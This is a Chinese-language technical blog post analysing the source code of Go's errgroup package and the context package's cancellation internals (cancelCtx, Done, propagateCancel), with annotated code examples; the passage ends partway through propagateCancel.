content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Go errgroup 源码深度剖析：从原理到 Context 取消机制全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3722294009017404/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    下次一定57
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:07:36.000Z" title="Tue Feb 03 2026 10:07:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Go errgroup</h2>
<p>专门用于简化一组 goroutine 的生命周期管理和错误收集，解决了普通<code>WaitGroup</code>无法便捷收集错误、无法快速取消其他 goroutine 的痛点。</p>
<h2 data-id="heading-1">errgroup vs 原生 WaitGroup</h2>






























<table><thead><tr><th align="center">特性</th><th align="center">sync.WaitGroup</th><th align="center">errgroup</th></tr></thead><tbody><tr><td align="center">等待 goroutine 结束</td><td align="center">需要手动 Add/Done</td><td align="center">自动管理，无需手动调用</td></tr><tr><td align="center">收集错误</td><td align="center">需要自己用 channel 实现</td><td align="center">自动收集第一个非 nil 错误</td></tr><tr><td align="center">取消其他 goroutine</td><td align="center">需要自己结合 Context 实现</td><td align="center">内置 Context，自动取消</td></tr><tr><td align="center">使用复杂度</td><td align="center">低（但扩展功能复杂）</td><td align="center">中（一站式解决多 goroutine 问题）</td></tr></tbody></table>
<h2 data-id="heading-2">使用示例</h2>
<p>下面代码是 通过开启三个 goroutine 并发执行，能够感知错误，并且便捷收集第一个错误</p>
<p><code>context.Cause(ctx)</code>  这个函数是专门用来获取 Context 取消原因的，后续会详细介绍</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"errors"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"time"</span>

	<span class="hljs-string">"golang.org/x/sync/errgroup"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	eg, ctx := errgroup.WithContext(context.Background())
	eg.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		fmt.Println(<span class="hljs-string">"doing task1"</span>)
		time.Sleep(<span class="hljs-number">5</span> * time.Second)
		<span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">"task1 error"</span>) <span class="hljs-comment">// 业务错误：作为取消原因 这边取消 其他 goroutine  就会走 &lt;-ctx.Done()</span>
	})

	eg.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		<span class="hljs-keyword">for</span> {
			<span class="hljs-keyword">select</span> {
			<span class="hljs-keyword">case</span> &lt;-time.After(time.Second):
				fmt.Println(<span class="hljs-string">"doing task2"</span>)
			<span class="hljs-keyword">case</span> &lt;-ctx.Done():
				fmt.Println(<span class="hljs-string">"task2 canceled"</span>)
				<span class="hljs-comment">// 可以调用 context.Cause()，获取取消的具体原因 </span>
				cause := context.Cause(ctx)
				fmt.Printf(<span class="hljs-string">"task2 被取消的原因：%v\n"</span>, cause)
				<span class="hljs-keyword">return</span> ctx.Err()  <span class="hljs-comment">//这时候 return 的错误 是第二次或者第三次了 我们只记录第一次的</span>
			}
		}
	})

	eg.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> {
		<span class="hljs-keyword">for</span> {
			<span class="hljs-keyword">select</span> {
			<span class="hljs-keyword">case</span> &lt;-time.After(time.Second):
				fmt.Println(<span class="hljs-string">"doing task3"</span>)
			<span class="hljs-keyword">case</span> &lt;-ctx.Done():
				fmt.Println(<span class="hljs-string">"task3 canceled"</span>)
				<span class="hljs-comment">// 可以调用 context.Cause()，获取取消的具体原因</span>
				cause := context.Cause(ctx)
				fmt.Printf(<span class="hljs-string">"task3 被取消的原因：%v\n"</span>, cause)
				<span class="hljs-keyword">return</span> ctx.Err()
			}
		}
	})

	err := eg.Wait()
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		fmt.Println(<span class="hljs-string">"task failed"</span>)
		<span class="hljs-comment">// 在 Wait() 后, 返回第一次错误</span>
		fmt.Printf(<span class="hljs-string">"整体任务被取消的原因：%v\n"</span>, err)
	} <span class="hljs-keyword">else</span> {
		fmt.Println(<span class="hljs-string">"task success"</span>)
	}
}

</code></pre>
<h2 data-id="heading-3">errgroup 源码解析</h2>
<h3 data-id="heading-4">内部结构体</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 空结构体在 Go 中不占用字节内存，是标准用于通知的</span>
<span class="hljs-keyword">type</span> token <span class="hljs-keyword">struct</span>{}

<span class="hljs-keyword">type</span> Group <span class="hljs-keyword">struct</span> {
	cancel <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">error</span>)</span></span>  <span class="hljs-comment">//  取消下级关联 Context 的函数</span>

	wg sync.WaitGroup  <span class="hljs-comment">// 管理 goroutine 的等待，替代手动 Add/Done</span>

	sem <span class="hljs-keyword">chan</span> token  <span class="hljs-comment">// 带缓冲的通道 限制最大能有几个 goroutine 并行 用 SetLimit 函数去指明 不用这个函数那这个字段就不用管</span>

	errOnce sync.Once  <span class="hljs-comment">// 原子语句  无论多少 goroutine 写入 都只执行一次 </span>
	err     <span class="hljs-type">error</span>
}

</code></pre>
<h3 data-id="heading-5">入口函数</h3>
<p>新版本使用了 <code>WithCancelCause</code>  换掉了传统的 <code>context.WithCancel</code></p>
<p>对于  <code>context.WithCancelCause</code> 与  <code>context.WithCancel</code> 的 源码 放在文章最后，深入理解 <code>context</code>  可阅读</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithContext</span><span class="hljs-params">(ctx context.Context)</span></span> (*Group, context.Context) {
    <span class="hljs-comment">//返回 子Context 和 可以取消的函数  这里覆盖了主 ctx 无所谓</span>
	ctx, cancel := context.WithCancelCause(ctx)
 	<span class="hljs-comment">// 返回 errgroup 内置 结构体 和 context</span>
	<span class="hljs-keyword">return</span> &amp;Group{cancel: cancel}, ctx
}

</code></pre>
<h3 data-id="heading-6"><code>(g *Group) SetLimit(n int)</code> 函数</h3>
<p>用于控制同时活跃的 goroutine 数量，实现并发限制，小于0，就没有限制，也就不用 <code>g.sem</code> 字段</p>
<p>必须是在初始化的时候去调用 <code>SetLimit</code>  函数，必须保证当前无活跃 goroutine，否则直接 panic 为了安全</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *Group)</span></span> SetLimit(n <span class="hljs-type">int</span>) {
	<span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span> {
		g.sem = <span class="hljs-literal">nil</span>
		<span class="hljs-keyword">return</span>
	}
	<span class="hljs-keyword">if</span> active := <span class="hljs-built_in">len</span>(g.sem); active != <span class="hljs-number">0</span> {
		<span class="hljs-built_in">panic</span>(fmt.Errorf(<span class="hljs-string">"errgroup: modify limit while %v goroutines in the group are still active"</span>, active))
	}
    <span class="hljs-comment">// 启动 容量为 n 的 cannel </span>
	g.sem = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> token, n)
}

</code></pre>
<h3 data-id="heading-7"><code>(g *Group) done()</code> 函数</h3>
<p>本质对 <code>WaitGroup</code> 封装了一个 对 goroutine 数量限制 不设置的话 就相当于 <code>WaitGroup.Done()</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *Group)</span></span> done() {
	<span class="hljs-keyword">if</span> g.sem != <span class="hljs-literal">nil</span> {  <span class="hljs-comment">// 如果设置了goroutine数量限制</span>
		&lt;-g.sem       <span class="hljs-comment">// 释放信号量，从sem通道取出一个token，允许新的goroutine启动</span>
	}
	g.wg.Done()       <span class="hljs-comment">// 通知 WaitGroup：一个goroutine执行完成</span>
}
</code></pre>
<h3 data-id="heading-8"><code>(g *Group) Wait()</code> 函数</h3>
<p>同样也是多封装了一下 调用 <code>cancel(g.err) </code>方法 去记录错误（如果有的话） 内部具体细节可以看最后源码</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *Group)</span></span> Wait() <span class="hljs-type">error</span> {
	g.wg.Wait()          <span class="hljs-comment">// 阻塞，直到所有goroutine调用了wg.Done()</span>
	<span class="hljs-keyword">if</span> g.cancel != <span class="hljs-literal">nil</span> { <span class="hljs-comment">// 如果绑定了Context（通过WithContext创建）</span>
		g.cancel(g.err)  <span class="hljs-comment">// 取消Context，传递错误作为取消原因</span>
	}
	<span class="hljs-keyword">return</span> g.err         <span class="hljs-comment">// 返回第一个非nil错误（无错误则返回nil）</span>
}
</code></pre>
<h3 data-id="heading-9">核心 <code>(g *Group) Go</code> 函数</h3>
<p>这里并没有捕获 <code>panic</code> ，如果捕捉的话可能导致 <code>panic</code> 时机延迟，调试困难，<code>panic</code> 栈会被转为普通值，无法被监控工具捕获，而且还可能导致死锁</p>
<p>比如 两个<code>goroutine</code>被创建 第一个发生 <code>panic </code>第二个在阻塞等待，<code>Wait</code> 需要等待两个任务结束才返回，死锁</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *Group)</span></span> Go(f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span>) {
	<span class="hljs-comment">// 若设置了goroutine数量限制，先获取信号量 如果已经满了 阻塞直到有空闲token</span>
	<span class="hljs-keyword">if</span> g.sem != <span class="hljs-literal">nil</span> {
		g.sem &lt;- token{} <span class="hljs-comment">// 发送空token到sem通道，占用一个并发名额</span>
	}

	<span class="hljs-comment">// 增加WaitGroup计数</span>
	g.wg.Add(<span class="hljs-number">1</span>)
	
	<span class="hljs-comment">// 启动新goroutine执行任务</span>
	<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
		<span class="hljs-keyword">defer</span> g.done() <span class="hljs-comment">// 最后执行无论错误还是正常</span>

		<span class="hljs-comment">// 执行用户传入的函数，获取错误</span>
		<span class="hljs-keyword">if</span> err := f(); err != <span class="hljs-literal">nil</span> {
			<span class="hljs-comment">// 仅第一次执行  保证只存第一个错误</span>
			g.errOnce.Do(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
				g.err = err          <span class="hljs-comment">// 存储第一个错误</span>
				<span class="hljs-keyword">if</span> g.cancel != <span class="hljs-literal">nil</span> { <span class="hljs-comment">// 若绑定了Context，取消所有关联 goroutine 大部分都会有的 因为我们在入口传了</span>
					g.cancel(g.err)
				}
			})
		}
	}()
}

<span class="hljs-comment">// 这个函数和 Go 的唯一区别就是 它不阻塞 一旦数量满了 直接退出</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *Group)</span></span> TryGo(f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span>) <span class="hljs-type">bool</span> {
    	<span class="hljs-keyword">if</span> g.sem != <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">select</span> {
		<span class="hljs-keyword">case</span> g.sem &lt;- token{}: <span class="hljs-comment">// 成功获取token</span>
		<span class="hljs-keyword">default</span>:               <span class="hljs-comment">// 无空闲token  并发数达上限，直接返回false</span>
			<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
		}
	}
    ...  <span class="hljs-comment">//逻辑一样</span>
}

</code></pre>
<h2 data-id="heading-10">Context 部分源码</h2>
<h3 data-id="heading-11"><code>context.WithCancelCause</code> 与  <code>context.WithCancel</code> 的 源码 区别</h3>
<p>简单理解就是在返回 <code>cancel</code>函数的时候多了一个参数而已</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithCancel</span><span class="hljs-params">(parent Context)</span></span> (ctx Context, cancel CancelFunc) {
	c := withCancel(parent)
	<span class="hljs-keyword">return</span> c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> { c.cancel(<span class="hljs-literal">true</span>, Canceled, <span class="hljs-literal">nil</span>) }
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithCancelCause</span><span class="hljs-params">(parent Context)</span></span> (ctx Context, cancel CancelCauseFunc) {
	c := withCancel(parent)
	<span class="hljs-keyword">return</span> c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cause <span class="hljs-type">error</span>)</span></span> { c.cancel(<span class="hljs-literal">true</span>, Canceled, cause) }
}

</code></pre>
<h3 data-id="heading-12">先介绍核心结构体 <code>cancelCtx</code>  和 <code>cancelCtx.cancel</code> 方法</h3>
<p><code>context.WithCancel</code> 和 <code>context.WithCancelCause</code> 以及 <code>context.WithTimeout</code> 都有它的影子</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 核心结构体 cancelCtx</span>
<span class="hljs-keyword">type</span> cancelCtx <span class="hljs-keyword">struct</span> {
	Context          <span class="hljs-comment">//       嵌入父Context，继承父Context的所有方法（Done/Err/Value等）  该字段是个接口</span>
	mu       sync.Mutex            <span class="hljs-comment">// 保护以下字段的并发读写安全</span>
	done     atomic.Value       <span class="hljs-comment">// 存储chan struct{}，负责通知外部阻塞函数 查看 Done方法 和 Cancel 方法 之后就明白</span>
	children <span class="hljs-keyword">map</span>[canceler]<span class="hljs-keyword">struct</span>{} <span class="hljs-comment">// 存储当前Context的子canceler，取消时会遍历取消所有子Context</span>
	err      atomic.Value          <span class="hljs-comment">// 存储取消时的错误（如context.Canceled），原子操作避免锁竞争</span>
	cause    <span class="hljs-type">error</span>                 <span class="hljs-comment">// WithCancelCause的核心 ：存储取消原因，仅在第一次取消时赋值</span>
}

<span class="hljs-comment">// context包内部的接口，定义了「可取消」的行为</span>
<span class="hljs-keyword">type</span> canceler <span class="hljs-keyword">interface</span> {
	cancel(removeFromParent <span class="hljs-type">bool</span>, err <span class="hljs-type">error</span>, cause <span class="hljs-type">error</span>)
	Done() &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{}
}
</code></pre>
<h3 data-id="heading-13">核心方法 <code>cancelCtx.cancel</code></h3>
<p>这个函数 是写方法，使用频率是极低的 可能就是手动 cancel 或者 父 context 进行 cancel，为了防止并发问题也就是同时进行 <code>c.err.Load()</code> 发现没有，然后都执行了 <code>c.err.Store(err)</code> 是有问题的 我们只记录第一次 而且后面 <code>close(d)</code> 会报错，这里必须用锁，也不会影响性能</p>
<p>读方法 <code>Err()、Done()</code> 方法 常见 <code>for + select</code> 可能每个 goroutine 每毫秒跑几万次，这种就不能加锁，太影响性能 这个时候就体现出来 <code>atomic.Value </code> 这个字段的好处，防止一个 goroutine 在 <code>cancel() </code>里写 <code>c.err</code>，另一个 goroutine 同时在 Err() 里读 <code>c.err</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span></span> cancel(removeFromParent <span class="hljs-type">bool</span>, err, cause <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// Context 设计原则：取消必须关联错误</span>
    <span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> {
        <span class="hljs-built_in">panic</span>(<span class="hljs-string">"context: internal error: missing cancel error"</span>)
    }
    
    <span class="hljs-comment">// 旧版本 并没有 WithCancelCause 也就没有这个字段 兼容 旧逻辑</span>
    <span class="hljs-keyword">if</span> cause == <span class="hljs-literal">nil</span> {
        cause = err
    }

    <span class="hljs-comment">// 上面已经解释</span>
    c.mu.Lock()
    <span class="hljs-comment">// 看一下 里面有没有数据</span>
    <span class="hljs-keyword">if</span> c.err.Load() != <span class="hljs-literal">nil</span> {  <span class="hljs-comment">//原子地把值拿出来</span>
        c.mu.Unlock()
        <span class="hljs-keyword">return</span>  <span class="hljs-comment">// 说明有数据 已经写过了 只要写过了 就一定是在这个函数中写的 说明运行过一次 直接return</span>
    }

    <span class="hljs-comment">// 到这说明第一次进 cancel 方法 写入错误下一个 goroutine 再来调用 直接 return</span>
    c.err.Store(err)   <span class="hljs-comment">// 原子操作：高频读取时无需加锁，性能更优</span>
    c.cause = cause    <span class="hljs-comment">// 保证了仅第一次赋值有效  因为第二次直接 return </span>

    
    <span class="hljs-comment">// 关闭取消信号通道，用于通知外部 select { case &lt;-ctx.Done(): } 消除阻塞</span>
    d, _ := c.done.Load().(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{})
    <span class="hljs-keyword">if</span> d == <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">// 懒创建 下面会详细讲</span>
        c.done.Store(closedchan)
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 若 done 通道已创建，关闭通道 消除阻塞</span>
        <span class="hljs-built_in">close</span>(d)
    }

    <span class="hljs-comment">// 递归取消所有子 Context</span>
    <span class="hljs-keyword">for</span> child := <span class="hljs-keyword">range</span> c.children {
        <span class="hljs-comment">// 持有父锁时获取子锁会有嵌套锁风险，但 Context 取消是低频操作，可接受 </span>
        child.cancel(<span class="hljs-literal">false</span>, err, cause)
    }
    <span class="hljs-comment">// 清空子列表，释放内存，避免泄漏</span>
    c.children = <span class="hljs-literal">nil</span>

    <span class="hljs-comment">//解锁</span>
    c.mu.Unlock()

    <span class="hljs-comment">// 基本上都是 True  默认移除 避免内存泄漏</span>
    <span class="hljs-keyword">if</span> removeFromParent {
        <span class="hljs-comment">// 从父 Context 移除自身</span>
        removeChild(c.Context, c)
    }
}

</code></pre>
<h3 data-id="heading-14">懒创建</h3>
<p>我们在写代码的时候，很少去写 <code>ctx.Done()</code>  方法，非常常见的两种，要么不用，要么只用  <code>cancel</code></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 第一种 不用</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">work</span><span class="hljs-params">(ctx context.Context)</span></span> {
    time.Sleep(<span class="hljs-number">10</span> * time.Second)
}

<span class="hljs-comment">// 第二种 只 cancel</span>
ctx, cancel := context.WithCancel(parent)
<span class="hljs-keyword">defer</span> cancel()

doSomething(ctx) <span class="hljs-comment">// ctx 只是被传来传去</span>
</code></pre>
<p>正常逻辑是 建完 <code>ctx</code> 要使用 <code>Done()</code>方法</p>
<p>它进行了两次判断 其实可以进行一次 在刚开始进来的时候加锁就可以直接判断是否有值，可以一样的效果，但是这个函数读极多，就写一次，所以大多数情况下都直接返回，根本不需要锁，如果按刚开始就加锁，性能直线下降</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span></span> Done() &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{} {  <span class="hljs-comment">//返回一个只能接收的 channel</span>
	d := c.done.Load() <span class="hljs-comment">//第一次读取</span>
	<span class="hljs-keyword">if</span> d != <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">//之前已经调用过 Done() </span>
		<span class="hljs-keyword">return</span> d.(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{})
	}
	c.mu.Lock()
	<span class="hljs-keyword">defer</span> c.mu.Unlock()
	d = c.done.Load() <span class="hljs-comment">// 第二次重新读取</span>
	<span class="hljs-keyword">if</span> d == <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">// 第一次 初始化并存入</span>
		d = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{})
		c.done.Store(d)
	}
	<span class="hljs-keyword">return</span> d.(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{})
}
</code></pre>
<p>解释  <code> Done()</code>  是 极高频函数</p>
<p>go语言非常常见的 阻塞循环，每次执行 <code>ctx.Done()</code> 函数 返回的没有数据的 channel 只能走 default 逻辑，default 啥也不干 然后再回到 select 语句中 在执行 <code>ctx.Done()</code> 函数 直到 调用 <code>concel</code> 函数 ，可能每毫秒跑几万次，只第一次进行了修改，进行了两次判断，其他的都是直接返回，所以不能在刚开始进行加锁</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">for</span> {
    <span class="hljs-keyword">select</span> {
    <span class="hljs-keyword">case</span> &lt;-ctx.Done():
        <span class="hljs-keyword">return</span>
    <span class="hljs-keyword">default</span>:
    }
}
</code></pre>
<h3 data-id="heading-15">深入 <code>withCancel</code> 函数</h3>
<p>我们都知道 <code>parent</code> 参数一般情况就是我们自己传的 <code>ctx</code> 可能是 <code>context.WithCancel</code> 或者 <code>context.Background</code></p>
<p>在标准项目或者大型项目中，在主要内部结构体中会定义 <code>cancel</code> 字段用于 优雅退出</p>
<p>如果 <code>parent</code> 是  <code>context.Background</code>  没啥意义，</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">withCancel</span><span class="hljs-params">(parent Context)</span></span> *cancelCtx {
	<span class="hljs-keyword">if</span> parent == <span class="hljs-literal">nil</span> {
		<span class="hljs-built_in">panic</span>(<span class="hljs-string">"cannot create context from nil parent"</span>)
	}
	<span class="hljs-comment">// 1. 创建空的cancelCtx实例</span>
	c := &amp;cancelCtx{}
	<span class="hljs-comment">// 2. 建立当前 cancelCtx 和父 Context 的关联，作用是父取消时，子也会被取消</span>
	c.propagateCancel(parent, c)
	<span class="hljs-keyword">return</span> c
}
</code></pre>
<h3 data-id="heading-16"><code>propagateCancel</code> 函数</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *cancelCtx)</span></span> propagateCancel(parent Context, child canceler) {
	<span class="hljs-comment">// 挂载到字段 </span>
	c.Context = parent

	<span class="hljs-comment">// 查看 父Context是否可取消</span>
	done := parent.Done()
	<span class="hljs-keyword">if</span> done == <span class="hljs-literal">nil</span> {
		<span class="hljs-keyword">return</span> 		<span class="hljs-comment">//  如果是 context.Background 无需关联，父永远不会取消，子只能手动取消</span>
	}

	<span class="hljs-comment">// 检查父Context是否已经取消  非阻塞</span>
	<span class="hljs-keyword">select</span> {
	<span class="hljs-keyword">case</span> &lt;-done:
		<span class="hljs-comment">// 父已取消：立即取消子Context，继承父的错误和原因  这里的child 也就是我们刚创建的  空的cancelCtx实例</span>
		child.cancel(<span class="hljs-literal">false</span>, parent.Err(), Cause(parent))
		<span class="hljs-keyword">return</span>
	<span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 父没取消  正常情况，在代码健壮的情况下 不太可能刚创建就取消了</span>
	}

	<span class="hljs-comment">// 断言 将父Context转为 *cancelCtx  几乎所有的Context 底层都有它的影子 这是最常见的</span>
	<span class="hljs-keyword">if</span> p, ok := parentCancelCtx(parent); ok {
		p.mu.Lock() <span class="hljs-comment">// 加锁保证并发安全</span>
		<span class="hljs-keyword">if</span> err := p.err.Load(); err != <span class="hljs-literal">nil</span> {
			<span class="hljs-comment">// 父已取消：立即取消刚创建的 cancelCtx实例</span>
			child.cancel(<span class="hljs-literal">false</span>, err.(<span class="hljs-type">error</span>), p.cause)
		} <span class="hljs-keyword">else</span> {
			<span class="hljs-comment">// 父未取消：将子Context加入父的children列表 当父取消时会遍历取消子</span>
			<span class="hljs-keyword">if</span> p.children == <span class="hljs-literal">nil</span> {  <span class="hljs-comment">//第一次需要创建</span>
				p.children = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[canceler]<span class="hljs-keyword">struct</span>{})
			}
			p.children[child] = <span class="hljs-keyword">struct</span>{}{}
		}
		p.mu.Unlock()
		<span class="hljs-keyword">return</span>   <span class="hljs-comment">// 大多数到这返回了</span>
	}

	<span class="hljs-comment">// 特殊情况：父Context实现了afterFuncer接口（比如WithDeadline/WithTimeout）</span>
	<span class="hljs-keyword">if</span> a, ok := parent.(afterFuncer); ok {
		c.mu.Lock()
		<span class="hljs-comment">// 注册回调：父取消时，触发子取消</span>
		stop := a.AfterFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
			child.cancel(<span class="hljs-literal">false</span>, parent.Err(), Cause(parent))
		})
		<span class="hljs-comment">// 包装父Context，记录stop函数（子取消时可停止回调）</span>
		c.Context = stopCtx{
			Context: parent,
			stop:    stop,
		}
		c.mu.Unlock()
